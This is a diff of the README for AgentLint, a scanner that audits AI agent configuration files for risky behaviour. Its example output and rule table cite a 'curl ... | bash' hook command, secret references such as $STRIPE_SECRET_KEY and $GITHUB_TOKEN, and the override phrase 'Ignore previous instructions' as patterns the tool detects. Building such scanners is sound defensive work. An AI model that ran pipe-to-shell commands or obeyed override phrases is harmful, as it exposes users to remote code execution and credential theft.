@@ -1,144 +1,246 @@
-# AgentLint
+<p align="center">
+  <h1 align="center">AgentLint</h1>
+  <p align="center">
+    <strong>Supply-chain security for AI agent configurations</strong>
+  </p>
+  <p align="center">
+    <a href="https://github.com/akz4ol/agentlint/actions/workflows/ci.yml"><img src="https://github.com/akz4ol/agentlint/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
+    <a href="https://www.npmjs.com/package/agentlint"><img src="https://img.shields.io/npm/v/agentlint.svg" alt="npm"></a>
+    <a href="https://github.com/akz4ol/agentlint/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-blue.svg" alt="License"></a>
+  </p>
+</p>
 
-**Static analysis and security scanner for AI agent configuration files**
+---
 
-> Installing agent skills should be as safe, auditable, and predictable as installing software dependencies.
+**AgentLint** helps developers and security teams **audit AI agent configurations** before they execute—catching `curl | bash`, secret leaks, and privilege escalation in Claude Code, Cursor, and CLAUDE.md files.
 
-AgentLint is a static analysis and policy enforcement tool for AI agent configuration files. It enables developers and organizations to understand *what an agent configuration can do*, detect risks early, and enforce safety rules before execution.
+## Why AgentLint?
 
-## Features
+AI coding agents are powerful—but their configuration files are a new attack surface:
 
-- **Multi-tool Support**: Scans Claude Code (`.claude/`), Cursor (`.cursorrules`), and `CLAUDE.md`/`AGENTS.md` files
-- **Security Detection**: Identifies shell execution, network access, credential usage, and sensitive file access
-- **Policy Enforcement**: CI/CD gating with configurable severity thresholds
-- **Multiple Output Formats**: Text, JSON, and SARIF (GitHub code scanning)
-- **Diff Analysis**: Detect behavioral changes between versions
-- **Permission Manifests**: Generate recommended permission declarations
+- **Skills can run shell commands** → supply-chain risk
+- **Hooks execute automatically** → no user approval
+- **Configs reference secrets** → credential exposure
+- **Anyone can share skills** → no vetting process
 
-## Installation
-
-```bash
-npm install -g agentlint
-```
+AgentLint treats agent configs like code: **scan, diff, and gate them in CI.**
 
 ## Quick Start
 
 ```bash
-# Scan current directory
+# Install
+npm install -g agentlint
+
+# Scan your project
 agentlint scan
-
-# Scan with CI mode (for pipelines)
-agentlint scan --ci
-
-# Generate SARIF for GitHub code scanning
-agentlint scan --format sarif --output results.sarif
-
-# Compare two versions
-agentlint diff ./old-config ./new-config
-
-# List available rules
-agentlint rules list
-
-# Explain a specific rule
-agentlint rules explain EXEC-001
 ```
+
+**Expected output (clean project):**
+```
+AgentLint scan: .
+
+Parsed: 2 documents (claude=2)
+
+No findings detected.
+
+Status: PASS
+```
+
+**Expected output (risky config):**
+```
+AgentLint scan: .
+
+Parsed: 4 documents (claude=3, cursor=1)
+Context: hooks detected
+
+Findings:
+  HIGH  EXEC-001 Dynamic Shell Execution
+    .claude/hooks/post_edit.sh:5
+    Evidence: "curl https://example.com/install.sh | bash"
+
+  HIGH  SEC-001 Environment Secret Reference
+    CLAUDE.md:14
+    Reference to secret: $STRIPE_SECRET_KEY
+
+Status: FAIL (2 high)
+```
+
+## How It Works
+
+```
+┌─────────────────┐     ┌──────────────┐     ┌─────────────┐
+│  .claude/       │     │              │     │             │
+│  .cursorrules   │────▶│  AgentLint   │────▶│  Findings   │
+│  CLAUDE.md      │     │              │     │             │
+└─────────────────┘     └──────────────┘     └─────────────┘
+        │                      │                    │
+        ▼                      ▼                    ▼
+   Parse to IR          Apply 20 Rules      Text/JSON/SARIF
+```
+
+1. **Parse** agent configs into a normalized internal representation
+2. **Analyze** with 20 security rules across 8 categories
+3. **Report** findings with evidence and remediation guidance
+4. **Gate** in CI with configurable severity thresholds
+
+## Examples
+
+Try AgentLint on our example configs:
+
+```bash
+# Clean config (passes)
+agentlint scan examples/minimal
+
+# Risky config (fails with findings)
+agentlint scan examples/realistic
+```
+
+See [examples/](examples/) for full details.
+
+## What It Detects
+
+| Category | Rules | What It Catches |
+|----------|-------|-----------------|
+| **Execution** | EXEC-001, 002, 003 | `curl \| bash`, eval, hooks running commands |
+| **Filesystem** | FS-001, 002, 003 | Unscoped writes, `.git/` access, sensitive paths |
+| **Network** | NET-001, 002, 003 | Undeclared network, remote script fetches |
+| **Secrets** | SEC-001, 002, 003 | `$GITHUB_TOKEN`, `.env` access, secret propagation |
+| **Hooks** | HOOK-001, 002 | Auto-triggered side effects, hidden hooks |
+| **Instructions** | INST-001, 002 | "Ignore previous instructions", self-modification |
+| **Scope** | SCOPE-001, 002 | Capability expansion, write scope widening |
+| **Observability** | OBS-001, 002 | Missing declarations, no permission manifest |
+
+Run `agentlint rules list` to see all rules, or `agentlint rules explain EXEC-001` for details.
+
+## CI/CD Integration
+
+### GitHub Actions
+
+```yaml
+name: AgentLint
+on:
+  pull_request:
+    paths: [".claude/**", ".cursorrules", "CLAUDE.md", "AGENTS.md"]
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: npm install -g agentlint
+      - run: agentlint scan --ci --format sarif --output agentlint.sarif
+      - uses: github/codeql-action/upload-sarif@v3
+        with:
+          sarif_file: agentlint.sarif
+```
+
+Findings appear as code annotations in PRs via GitHub Code Scanning.
+
+### Exit Codes
+
+| Code | Meaning |
+|------|---------|
+| 0 | Pass |
+| 1 | Findings at/above threshold |
+| 2 | CLI usage error |
+| 3 | Config error |
+| 4 | Parse error |
+| 5 | Internal error |
 
 ## Configuration
 
-Create an `agentlint.yaml` file:
+Create `agentlint.yaml` to customize behavior:
 
 ```yaml
 version: 1
 
 policy:
-  fail_on: high
-  warn_on: medium
+  fail_on: high      # Fail CI on high severity
+  warn_on: medium    # Warn on medium severity
 
 rules:
-  disable:
-    - OBS-002
+  disable: [OBS-002] # Disable specific rules
 
 capabilities:
   fail_on_new_dynamic_shell: true
   fail_on_sensitive_path_write: true
 ```
 
-Initialize with defaults:
+Generate a starter config:
 
 ```bash
 agentlint init
 agentlint init --ci github  # Include GitHub Actions workflow
 ```
 
-## Rule Categories
+## Diff Mode
 
-| Category | Rules | Description |
-|----------|-------|-------------|
-| Execution (EXEC) | EXEC-001, EXEC-002, EXEC-003 | Shell execution risks |
-| Filesystem (FS) | FS-001, FS-002, FS-003 | File access and write risks |
-| Network (NET) | NET-001, NET-002, NET-003 | Network access risks |
-| Secrets (SEC) | SEC-001, SEC-002, SEC-003 | Credential and secret access |
-| Hook (HOOK) | HOOK-001, HOOK-002 | Automated hook risks |
-| Instruction (INST) | INST-001, INST-002 | Instruction override patterns |
-| Scope (SCOPE) | SCOPE-001, SCOPE-002 | Capability expansion |
-| Observability (OBS) | OBS-001, OBS-002 | Audit and visibility |
+Detect behavioral changes between versions:
 
-## Exit Codes
-
-| Code | Meaning |
-|------|---------|
-| 0 | Pass - no findings at or above fail threshold |
-| 1 | Fail - findings at/above fail threshold |
-| 2 | CLI usage error |
-| 3 | Config error |
-| 4 | Parse error |
-| 5 | Internal error |
-
-## GitHub Actions
-
-```yaml
-name: AgentLint
-
-on:
-  pull_request:
-    paths:
-      - ".claude/**"
-      - ".cursorrules"
-      - "CLAUDE.md"
-
-jobs:
-  agentlint:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - name: Install agentlint
-        run: npm install -g agentlint
-      - name: Scan
-        run: agentlint scan --ci --format sarif --output agentlint.sarif
-      - name: Upload SARIF
-        uses: github/codeql-action/upload-sarif@v3
-        with:
-          sarif_file: agentlint.sarif
+```bash
+agentlint diff ./before ./after
 ```
 
-## Supported Files
+```
+AgentLint diff: ./before → ./after
 
-### Claude Code
-- `.claude/skills/*.md` - Skill definitions
-- `.claude/agents/*.md` - Agent definitions
-- `.claude/hooks/*` - Hook scripts
-- `CLAUDE.md` - Project memory
+Behavioral changes:
+  HIGH  capability_expansion
+    shell_exec: false → true
 
-### Cursor
-- `.cursorrules` - Cursor rules
+  HIGH  network_new_outbound
+    network.outbound: false → true
 
-### Generic
-- `AGENTS.md` - Agent memory (best-effort)
+Status: FAIL (capability expansion detected)
+```
+
+## Comparison with Alternatives
+
+| | AgentLint | Manual Review | No Scanning |
+|---|---|---|---|
+| Detects `curl \| bash` | Automatic | Maybe | No |
+| CI integration | Native SARIF | Manual | N/A |
+| Diff detection | Semantic | Text diff | None |
+| Time to review | Seconds | Minutes–Hours | N/A |
+
+AgentLint is purpose-built for AI agent configs. General linters miss agent-specific risks.
+
+## Roadmap
+
+- [x] Claude Code support (`.claude/`, `CLAUDE.md`)
+- [x] Cursor support (`.cursorrules`)
+- [x] 20 security rules
+- [x] SARIF output for GitHub
+- [x] Diff mode
+- [ ] VS Code extension
+- [ ] GitHub Action (native)
+- [ ] Policy-as-code engine
+- [ ] Signed skill packs
+- [ ] Agent config registry
+
+## Documentation
+
+- [CLI Reference](docs/cli.md)
+- [FAQ](docs/faq.md)
+- [Architecture](docs/design.md)
+- [Contributing](CONTRIBUTING.md)
+- [Security Policy](SECURITY.md)
 
 ## Contributing
 
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for:
+
+- Development setup
+- Adding new rules
+- Coding standards
+- PR process
 
 ## License
 
-Apache 2.0 - See [LICENSE](LICENSE) for details.
+Apache 2.0 — see [LICENSE](LICENSE)
+
+---
+
+<p align="center">
+  <sub>Built to secure the AI agent ecosystem</sub>
+</p>
